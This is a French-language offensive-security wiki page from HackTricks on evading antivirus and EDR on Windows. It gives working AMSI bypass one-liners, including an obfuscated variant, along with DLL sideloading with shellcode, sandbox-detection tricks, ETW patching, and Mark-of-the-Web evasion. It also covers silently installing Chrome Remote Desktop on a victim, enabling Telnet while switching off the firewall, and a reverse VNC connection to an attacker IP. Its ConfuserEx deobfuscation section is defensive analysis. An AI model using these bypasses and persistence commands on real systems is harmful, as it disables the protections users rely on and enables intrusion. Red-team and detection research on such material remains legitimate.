# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil pour empêcher Windows Defender de fonctionner en simulant un autre AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : détection statique, analyse dynamique, et pour les EDRs les plus avancés, analyse comportementale.

### **Static detection**

La détection statique s'obtient en signalant des chaînes connues ou des tableaux d'octets dans un binaire ou un script, et en extrayant aussi des informations depuis le fichier lui-même (par ex. file description, company name, digital signatures, icon, checksum, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire repérer plus facilement, car ils ont probablement été analysés et signalés comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Encryption**

Si vous chiffrez le binaire, il n'y aura aucun moyen pour l'AV de détecter votre programme, mais vous aurez besoin d'un loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois il suffit de changer quelques chaînes dans votre binaire ou script pour le faire passer devant l'AV, mais cela peut être une tâche longue selon ce que vous essayez d'obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n'y aura pas de signatures connues, mais cela prend beaucoup de temps et d'efforts.

> [!TIP]
> Un bon moyen pour vérifier la détection statique par Windows Defender est [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il découpe essentiellement le fichier en plusieurs segments puis demande à Defender d'analyser chacun individuellement ; de cette manière, il peut vous dire exactement quelles sont les chaînes ou octets signalés dans votre binaire.

Je vous recommande vivement de consulter cette [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l'évasion AV pratique.

### **Dynamic analysis**

L'analyse dynamique, c'est lorsque l'AV exécute votre binaire dans un sandbox et observe les activités malveillantes (par ex. tenter de déchiffrer et lire les mots de passe du navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques choses que vous pouvez faire pour échapper aux sandboxes.

- **Sleep before execution** Selon son implémentation, cela peut être un excellent moyen de contourner l'analyse dynamique des AV. Les AV ont un temps très court pour analyser les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc utiliser de longs sleep peut perturber l'analyse des binaires. Le problème est que beaucoup de sandboxes d'AV peuvent simplement ignorer le sleep selon leur implémentation.
- **Checking machine's resources** En général, les sandboxes disposent de très peu de ressources (par ex. < 2GB RAM), sinon elles ralentiraient la machine de l'utilisateur. Vous pouvez aussi devenir très créatif ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs ; tout ne sera pas implémenté dans le sandbox.
- **Machine-specific checks** Si vous voulez cibler un utilisateur dont la station de travail est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui spécifié ; si ce n'est pas le cas, vous pouvez faire quitter votre programme.

Il se trouve que le nom de l'ordinateur du Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation ; si le nom correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de defender, et vous pouvez faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source : <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons dit plus haut dans ce post, les **outils publics** finiront par **être détectés**, donc vous devriez vous poser cette question :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d'utiliser mimikatz** ? Ou pouvez-vous utiliser un autre projet moins connu qui dump aussi LSASS.

La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, c'est probablement l'un des, si ce n'est le plus signalé par les AVs et EDRs ; bien que le projet soit super cool, il est aussi un cauchemar pour contourner les AVs, donc cherchez simplement des alternatives pour ce que vous essayez d'accomplir.

> [!TIP]
> Lorsque vous modifiez vos payloads pour l'évasion, assurez-vous de **désactiver la soumission automatique d'échantillons** dans defender, et s'il vous plaît, sérieusement, **NE PAS UPLOADER SUR VIRUSTOTAL** si votre objectif est d'atteindre l'évasion sur le long terme. Si vous voulez vérifier si votre payload est détecté par un AV particulier, installez-le dans une VM, essayez de désactiver la soumission automatique d'échantillons, et testez-y jusqu'à ce que vous soyez satisfait du résultat.

## EXEs vs DLLs

Dans la mesure du possible, priorisez toujours l'utilisation de DLLs pour l'évasion ; d'après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés, c'est donc une astuce très simple à utiliser pour éviter la détection dans certains cas (si votre payload a un moyen de s'exécuter en tant que DLL bien sûr).

Comme on peut le voir sur cette image, un payload DLL de Havoc a un taux de détection de 4/26 sur antiscan.me, alors que le payload EXE a un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nous allons maintenant montrer quelques astuces que vous pouvez utiliser avec des fichiers DLL pour être beaucoup plus furtif.

## DLL Sideloading & Proxying

**DLL Sideloading** exploite l'ordre de recherche des DLL utilisé par le loader en positionnant l'application victime et le(s) payload(s) malveillant(s) côte à côte.

Vous pouvez vérifier les programmes susceptibles de DLL Sideloading en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script powershell suivant :
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

Je vous recommande vivement d'**explorer vous-même les programmes DLL Hijackable/Sideloadable**, cette technique est assez furtive si elle est bien exécutée, mais si vous utilisez des programmes DLL Sideloadable publiquement connus, vous pouvez être facilement repéré.

Se contenter de placer une DLL malveillante portant le nom qu'un programme s'attend à charger ne suffira pas à exécuter votre payload, car le programme attend certaines fonctions spécifiques dans cette DLL ; pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** forwards the calls a program makes from the proxy (and malicious) DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your payload.

J'utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source pour la DLL, et la DLL d'origine renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 detection rate in [antiscan.me](https://antiscan.me)! Je considérerais cela comme un succès.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous recommande **vivement** de regarder [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sur DLL Sideloading et aussi [la vidéo d'ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) pour en apprendre davantage sur ce que nous avons abordé de manière plus approfondie.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'évasion n'est qu'un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain, donc ne comptez jamais sur un seul outil ; si possible, essayez d'enchaîner plusieurs techniques d'évasion.

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher [fileless malware](https://en.wikipedia.org/wiki/Fileless_malware). À l'origine, les AV ne pouvaient scanner que **les fichiers sur disque**, donc si vous pouviez exécuter des payloads **directement en mémoire**, l'AV ne pouvait rien faire pour l'empêcher, car il n'avait pas assez de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- User Account Control, or UAC (élévation d'EXE, COM, MSI ou installation ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation dynamique de code)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- macros Office VBA

Cela permet aux solutions antivirus d'inspecter le comportement des scripts en exposant leur contenu sous une forme non chiffrée et non obfusquée.

Exécuter `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l'alerte suivante sur Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il préfixe `amsi:` puis le chemin de l'exécutable depuis lequel le script a été lancé, dans ce cas powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais avons quand même été détectés en mémoire à cause d'AMSI.

De plus, à partir de **.NET 4.8**, le code C# passe aussi par AMSI. Cela affecte même `Assembly.Load(byte[])` pour le chargement en mémoire. C'est pourquoi il est recommandé d'utiliser des versions plus anciennes de .NET (comme 4.7.2 ou inférieure) pour l'exécution en mémoire si vous voulez échapper à AMSI.

Il existe plusieurs manières de contourner AMSI :

- **Obfuscation**

Puisque AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être une bonne façon d'échapper à la détection.

Cependant, AMSI est capable de désobfusquer des scripts même s'ils ont plusieurs couches d'obfuscation, donc l'obfuscation peut être une mauvaise option selon comment elle est faite. Cela rend l'évasion pas si simple. Toutefois, parfois, il suffit de changer quelques noms de variables et ça suffit, donc cela dépend du niveau de détection.

- **AMSI Bypass**

Étant donné qu'AMSI est implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible de la manipuler facilement même en tant qu'utilisateur non privilégié. En raison de cette faille dans l'implémentation d'AMSI, des chercheurs ont trouvé plusieurs moyens d'éviter l'analyse AMSI.

**Forcer une erreur**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) entraînera l'absence de lancement d'une analyse pour le processus courant. À l'origine, cela a été divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d'une unique ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell courant. Cette ligne a bien sûr été signalée par AMSI lui-même, donc une modification est nécessaire pour pouvoir utiliser cette technique.

Voici un AMSI bypass modifié que j'ai repris depuis ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que cela sera probablement signalé dès la publication de ce billet ; n'en publiez pas le code si votre objectif est de rester indétecté.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l'analyse des entrées fournies par l'utilisateur) et à la remplacer par des instructions renvoyant le code E_INVALIDARG ; ainsi, le résultat de l'analyse renverra 0, ce qui est interprété comme un résultat sain.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

Cet outil [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) génère également des scripts pour bypasser AMSI.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ou **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus courant. Ces outils fonctionnent en scannant la mémoire du processus courant à la recherche de la signature AMSI, puis en l'écrasant avec des instructions NOP, la supprimant ainsi de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous pouvez trouver une liste de produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser PowerShell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé ; vous pouvez donc exécuter vos scripts sans qu'ils soient analysés par AMSI. Vous pouvez faire cela :
```bash
powershell.exe -version 2
```
## Journalisation PowerShell

PowerShell logging est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile pour l'audit et le dépannage, mais cela peut aussi être un **problème pour les attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Disable PowerShell Transcription and Module Logging**: Vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Use Powershell version 2**: Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être scannés par AMSI. Vous pouvez faire ceci : `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer une session PowerShell sans protections (c'est ce que `powerpick` from Cobal Strike utilise).


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmente l'entropie du binaire et facilite sa détection par les AVs et EDRs. Faites attention à cela et n'appliquez éventuellement le chiffrement qu'à des sections spécifiques de votre code qui sont sensibles ou doivent être masquées.

### Désobfuscation des binaires .NET protégés par ConfuserEx

Lors de l'analyse de malware qui utilise ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le workflow ci‑dessous restaure de manière fiable un IL presque original qui peut ensuite être décompilé en C# avec des outils tels que dnSpy ou ILSpy.

1.  Suppression de l'anti-tampering – ConfuserEx chiffre chaque *corps de méthode* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Cela modifie aussi le checksum PE, donc toute modification fera planter le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles pour construire votre propre unpacker.

2.  Récupération des symboles / du flux de contrôle – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot compatible ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – sélectionner le profil ConfuserEx 2  
• de4dot annulera le flattening du flux de contrôle, restaurera les espaces de noms, classes et noms de variables originaux et déchiffrera les chaînes constantes.

3.  Suppression des proxy-call – ConfuserEx remplace les appels de méthode directs par des wrappers légers (a.k.a *proxy calls*) pour compliquer la décompilation. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape, vous devriez voir des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire résultant sous dnSpy, recherchez de grands blobs Base64 ou l'utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le payload *réel*. Souvent, le malware le stocke comme un tableau d'octets encodé TLV initialisé à l'intérieur de `<Module>.byte_0`.

La chaîne ci‑dessus restaure le flux d'exécution **sans** nécessiter l'exécution de l'échantillon malveillant – utile lorsqu'on travaille sur une station hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut être utilisé comme IOC pour trier automatiquement les échantillons.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Le but de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'apporter une sécurité logicielle accrue via la [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et le tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, à la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfusquées générées par le framework de metaprogramming de templates C++ qui rendra la vie de la personne souhaitant cracker l'application un peu plus difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscator binaire x64 capable d'obfusquer différents types de fichiers pe, y compris : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un simple moteur de code metamorphique pour exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework d'obfuscation de code fin pour les langages supportés par LLVM utilisant ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant des instructions régulières en chaînes ROP, déjouant notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un .NET PE Crypter écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir des EXE/DLL existants en shellcode puis de les charger

## SmartScreen & MoTW

Vous avez peut-être vu cet écran en téléchargeant certains exécutables depuis internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement avec une approche basée sur la réputation, ce qui signifie que les applications peu téléchargées déclencheront SmartScreen, alertant et empêchant ainsi l'utilisateur final d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nommé Zone.Identifier qui est automatiquement créé lors du téléchargement de fichiers depuis internet, avec l'URL depuis laquelle il a été téléchargé.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification de l'ADS Zone.Identifier pour un fichier téléchargé depuis internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **trusted** **ne déclencheront pas SmartScreen**.

Une façon très efficace d'empêcher que vos payloads obtiennent le Mark of The Web est de les empaqueter à l'intérieur d'une sorte de conteneur comme une ISO. Cela se produit parce que Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui emballe des payloads dans des conteneurs de sortie pour éviter Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un mécanisme de journalisation puissant dans Windows qui permet aux applications et aux composants système de **consigner des événements**. Cependant, il peut également être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

De la même manière que AMSI est désactivé (contourné), il est aussi possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans enregistrer d'événements. Cela se fait en patchant la fonction en mémoire pour qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous pouvez trouver plus d'infos dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Charger des binaires C# en mémoire est une technique connue depuis un certain temps et reste un excellent moyen d'exécuter vos outils post-exploitation sans se faire détecter par l'AV.

Puisque le payload sera chargé directement en mémoire sans toucher le disque, il faudra seulement s'occuper de patcher AMSI pour tout le processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) fournissent déjà la capacité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de procéder :

- **Fork\&Run**

Cela implique **de lancer un nouveau processus sacrificiel**, d'injecter votre code post-exploitation malveillant dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela a des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se déroule **en dehors** de notre processus d'implant Beacon. Cela signifie que si quelque chose dans notre action post-exploitation tourne mal ou se fait attraper, il y a une **bien plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande probabilité** d'être détecté par les **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code post-exploitation malveillant **dans son propre processus**. De cette façon, vous pouvez éviter de créer un nouveau processus qui serait scanné par l'AV, mais l'inconvénient est que si quelque chose tourne mal lors de l'exécution de votre payload, il y a une **bien plus grande chance** de **perdre votre beacon** car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous voulez en savoir plus sur le chargement d'Assembly C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des Assemblies C# **depuis PowerShell**, regardez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la vidéo de S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise accès **à l'environnement de l'interpréteur installé sur l'Attacker Controlled SMB share**.

En autorisant l'accès aux Interpreter Binaries et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le repo indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc., on a **plus de flexibilité pour contourner les signatures statiques**. Des tests avec des reverse shells non-obfusqués au hasard dans ces langages se sont avérés concluants.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le token d'accès ou un produit de sécurité comme un EDR ou AV**, leur permettant de réduire ses privilèges de sorte que le processus ne meure pas mais n'ait plus les permissions pour vérifier les activités malveillantes.

Pour prévenir cela, Windows pourrait **empêcher des processus externes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d'une victime puis de l'utiliser pour le prendre en main et maintenir la persistance :
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin without using the GUI).


## Advanced Evasion

L'évasion est un sujet très complexe ; parfois il faut prendre en compte de nombreuses sources de télémétrie dans un seul système, il est donc quasiment impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement contre lequel vous serez confronté aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette conférence de [@ATTL4S](https://twitter.com/DaniLJ94), pour obtenir une introduction aux techniques d'Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ceci est aussi une excellente conférence de [@mariuszbit](https://twitter.com/mariuszbit) à propos de l'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Anciennes techniques**

### **Vérifier quelles parties Defender considère comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui va **retirer des parties du binaire** jusqu'à ce qu'il **détermine quelle partie Defender** considère comme malveillante et vous la retourne.\
Un autre outil faisant la **même chose est** [**avred**](https://github.com/dobin/avred) avec une offre web ouverte du service sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu'à Windows10, toutes les versions de Windows étaient livrées avec un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites en sorte qu'il **démarre** au démarrage du système et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Modifier le port telnet** (furtif) et désactiver le pare-feu :
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (choisissez les binaires, pas l'installateur)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **nouvellement** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

